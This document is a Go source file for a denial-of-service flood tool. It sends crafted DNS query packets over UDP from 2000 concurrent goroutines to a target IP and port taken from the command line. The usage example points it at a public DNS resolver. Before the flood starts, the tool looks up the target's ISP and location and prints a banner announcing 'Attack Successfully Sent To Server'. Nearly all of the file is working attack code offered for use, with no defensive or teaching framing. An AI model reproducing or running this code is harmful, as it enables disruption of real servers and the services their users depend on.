package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

const totalGoroutines = 2000

type ISPInfo struct {
	Query   string `json:"query"`
	ISP     string `json:"isp"`
	Org     string `json:"org"`
	Country string `json:"country"`
	Region  string `json:"regionName"`
	City    string `json:"city"`
}

func getISPInfo(ip string) (ISPInfo, error) {
	resp, err := http.Get("http://ip-api.com/json/" + ip)
	if err != nil {
		return ISPInfo{}, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return ISPInfo{}, fmt.Errorf("failed to get ISP info: %s", resp.Status)
	}

	var info ISPInfo
	if err := json.NewDecoder(resp.Body).Decode(&info); err != nil {
		return ISPInfo{}, err
	}

	return info, nil
}

func generateValidDomain() string {
	domains := []string{"google.com", "example.com", "microsoft.com", "amazon.com", "facebook.com"}
	return domains[rand.Intn(len(domains))]
}

func createRealisticDNSQuery() []byte {
	transactionID := []byte{byte(rand.Intn(256)), byte(rand.Intn(256))}
	flags := []byte{0x01, 0x00}
	questions := []byte{0x00, 0x01}
	rrs := []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	domain := generateValidDomain()
	parts := strings.Split(domain, ".")
	queryName := []byte{}
	for _, part := range parts {
		queryName = append(queryName, byte(len(part)))
		queryName = append(queryName, []byte(part)...)
	}
	queryName = append(queryName, 0x00)
	queryType := []byte{0x00, 0x01}
	queryClass := []byte{0x00, 0x01}
	return append(append(append(transactionID, flags...), questions...), append(append(append(rrs, queryName...), queryType...), queryClass...)...)
}

func dnsFlood(target, port string, wg *sync.WaitGroup, count *int) {
	defer wg.Done()
	conn, err := net.Dial("udp", target+":"+port)
	if err != nil {
		fmt.Println("Error DNS Connection:", err)
		return
	}
	defer conn.Close()
	for {
		query := createRealisticDNSQuery()
		_, err := conn.Write(query)
		if err != nil {
			fmt.Println("Error Sent DNS Packet:", err)
			break
		}
		*count++
		time.Sleep(time.Millisecond * time.Duration(rand.Intn(50) + 10))
	}
}

func main() {
	if len(os.Args) != 3 {
		fmt.Println("Usage: go run udp.go <ip> <port>")
		fmt.Println("Example: go run udp.go 8.8.8.8 53")
		os.Exit(1)
	}

	target := os.Args[1]
	port := os.Args[2]

	info, err := getISPInfo(target)
	if err != nil {
		fmt.Println("Error ISP:", err)
		os.Exit(1)
	}

	fmt.Println("\x1b[38;2;3;8;255mT\x1b[38;2;3;19;255ma\x1b[38;2;3;30;255mr\x1b[38;2;3;41;255mg\x1b[38;2;3;51;255me\x1b[38;2;3;62;255mt\x1b[38;2;3;73;255m \x1b[38;2;3;84;255mI\x1b[38;2;3;95;255mn\x1b[38;2;3;106;255mf\x1b[38;2;3;117;255mo\x1b[38;2;3;128;255mr\x1b[38;2;3;138;255mm\x1b[38;2;3;149;255ma\x1b[38;2;3;160;255mt\x1b[38;2;3;171;255mi\x1b[38;2;3;182;255mo\x1b[38;2;3;193;255mn\x1b[38;2;3;204;255m \x1b[38;2;3;215;255m:\x1b[38;2;3;226;255m\033[0m")
	fmt.Printf("\x1b[38;5;1m[\033[0mIP\033[0m\x1b[38;5;1m]\033[0m          : %s\n", info.Query)
	fmt.Printf("\x1b[38;5;1m[\033[0mISP\033[0m\x1b[38;5;1m]\033[0m         : %s\n", info.ISP)
	fmt.Printf("\x1b[38;5;1m[\033[0mOrganization\033[0m\x1b[38;5;1m]\033[0m: %s\n", info.Org)
	fmt.Printf("\x1b[38;5;1m[\033[0mCountry\033[0m\x1b[38;5;1m]\033[0m     : %s\n", info.Country)
	fmt.Printf("\x1b[38;5;1m[\033[0mRegion\033[0m\x1b[38;5;1m]\033[0m      : %s\n", info.Region)
	fmt.Printf("\x1b[38;5;1m[\033[0mCity\033[0m\x1b[38;5;1m]\033[0m        : %s\n", info.City)
	fmt.Printf("\x1b[38;5;1m[\033[0mPort\033[0m\x1b[38;5;1m]\033[0m        : %s\n", port)
	fmt.Printf("\x1b[38;5;1m[\033[0mStatus\033[0m\x1b[38;5;1m]\033[0m      : \x1b[38;5;2mAttack Successfully Sent To Server\033[0m")
	var wg sync.WaitGroup
	var totalSent int

	for i := 0; i < totalGoroutines; i++ {
		wg.Add(1)
		go dnsFlood(target, port, &wg, &totalSent)
	}

	wg.Wait()
	fmt.Printf("Total DNS Packet Sent: %d\n", totalSent)
}